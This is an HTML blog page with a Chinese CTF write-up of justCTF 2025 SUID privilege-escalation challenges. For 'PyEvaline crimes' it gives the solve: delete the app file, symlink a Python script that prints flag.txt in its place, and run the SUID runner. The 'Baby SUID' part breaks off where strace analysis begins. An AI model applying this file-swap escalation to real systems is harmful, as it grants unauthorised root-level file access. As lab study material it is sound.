@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
+  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="suid位还是花">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LinuxAmd64中suid位实现提权">
+<meta property="og:url" content="https://baozongwi.xyz/posts/25610.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="suid位还是花">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-183451.jpg">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-191137.jpg">
+<meta property="article:published_time" content="2025-08-03T10:19:43.000Z">
+<meta property="article:modified_time" content="2025-08-08T04:07:41.508Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="姿势">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-183451.jpg">
+
+
+<link rel="canonical" href="https://baozongwi.xyz/posts/25610.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/25610.html","path":"posts/25610.html","title":"LinuxAmd64中suid位实现提权"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>LinuxAmd64中suid位实现提权 | baozongwi:H@cking Th3 Fu1ure</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PyEvaline-crimes"><span class="nav-number">1.</span> <span class="nav-text">PyEvaline crimes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-SUID"><span class="nav-number">2.</span> <span class="nav-text">Baby SUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baozongwi"
+      src="/images/acvtar.jpg">
+  <p class="site-author-name" itemprop="name">baozongwi</p>
+  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">202</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+<ul>
+  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
+  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
+  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
+  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
+  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
+</ul>
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/25610.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/acvtar.jpg">
+      <meta itemprop="name" content="baozongwi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="天地不仁，以万物为刍狗">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="LinuxAmd64中suid位实现提权 | baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="suid位还是花">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LinuxAmd64中suid位实现提权
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-08-03 18:19:43" itemprop="dateCreated datePublished" datetime="2025-08-03T18:19:43+08:00">2025-08-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-08-08 12:07:41" itemprop="dateModified" datetime="2025-08-08T12:07:41+08:00">2025-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/talks/" itemprop="url" rel="index"><span itemprop="name">talks</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>14k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>24 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">suid位还是花</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>周末和suers一起看了两个提权的题目，出自justCTF2025。</p>
+<h2 id="PyEvaline-crimes"><a href="#PyEvaline-crimes" class="headerlink" title="PyEvaline crimes"></a>PyEvaline crimes</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> _, <span class="type">char</span>** a, <span class="type">char</span>** envp)</span> &#123;</span><br><span class="line">	<span class="comment">// Omg such secure!</span></span><br><span class="line">	unsetenv(<span class="string">&quot;PYTHONPATH&quot;</span>);</span><br><span class="line">	unsetenv(<span class="string">&quot;PYTHONHOME&quot;</span>);</span><br><span class="line">	unsetenv(<span class="string">&quot;PYTHONSTARTUP&quot;</span>);</span><br><span class="line">	unsetenv(<span class="string">&quot;PYTHONBREAKPOINT&quot;</span>);</span><br><span class="line">	unsetenv(<span class="string">&quot;PYTHONUSERBASE&quot;</span>);</span><br><span class="line">	unsetenv(<span class="string">&quot;PYTHONEXECUTABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* argv[] = &#123;</span><br><span class="line">		<span class="string">&quot;python3&quot;</span>,</span><br><span class="line">		<span class="string">&quot;-E&quot;</span>, <span class="string">&quot;-I&quot;</span>, <span class="string">&quot;-s&quot;</span>,  <span class="comment">// Double, or triple secure!</span></span><br><span class="line">		<span class="string">&quot;/home/ctfplayer/app&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	execve(<span class="string">&quot;/usr/local/bin/python3&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题里面有个runner，删除了很多python的环境变量，并且非常严格的来利用python执行app，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> readline</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>():</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Goodbye!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;id&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uid:  %d,  gid: %d&quot;</span> % (os.getuid(), os.getgid()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;euid: %d, egid: %d&quot;</span> % (os.geteuid(), os.getegid()))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;ls&quot;</span>:</span><br><span class="line">        os.system(<span class="string">&quot;/bin/ls -lah&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;time&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;time now: &quot;</span>, time.time())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;rng&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rng:&quot;</span>, random.random())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;help&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Commands:</span></span><br><span class="line"><span class="string">    exit                - exit shell</span></span><br><span class="line"><span class="string">    help                - display this help</span></span><br><span class="line"><span class="string">    eval &lt;expression&gt;   - evalute given expression :)</span></span><br><span class="line"><span class="string">    id                  - show our id</span></span><br><span class="line"><span class="string">    ls                  - list files</span></span><br><span class="line"><span class="string">    time                - time now</span></span><br><span class="line"><span class="string">    rng                 - roll a dice!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cmd, expr = command.split(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd != <span class="string">&quot;eval&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;unrecognized command: &quot;</span>, cmd)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Too long expression, sorry&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    e = ast.literal_eval(expr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result of &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(expr, e))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TODO/<span class="doctag">FIXME:</span> Implement math expressions via pwnlib.util.safeeval.expr() </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to our crime shell!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Type `exit` to quit. Type `help` for help.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            process()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Oh, sorry, we got this exception:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>限制了eval函数，但是这里根本不用管这个jail，由于他会用<code>suid</code>权限来运行<code>app</code></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 python:<span class="number">3.13</span>.<span class="number">5</span>-bookworm</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=755 app /home/ctfplayer/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=4755 runner /home/ctfplayer/runner</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=400 flag.txt /home/ctfplayer/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctfplayer</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<p>所以进行如下操作即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf app</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;print(open(&quot;flag.txt&quot;).read())&#x27;</span> &gt; /tmp/exp.py</span><br><span class="line"><span class="built_in">ls</span> /tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /tmp/exp.py app </span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./runner</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-183451.jpg" alt="1"></p>
+<h2 id="Baby-SUID"><a href="#Baby-SUID" class="headerlink" title="Baby SUID"></a>Baby SUID</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 fedora:<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=4755 hello /usr/bin/hello</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=400 flag.txt /flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctfplayer</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctfplayer</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<p>里面有一个hello程序，是suid权限的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to JustCTF 2025, I鈥檓 rooting for you to succeed!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就没看出来什么了，先本地起个docker看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x run.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
+
+<p>用<code>strace</code>看看这个文件，直接拖到本地</p>
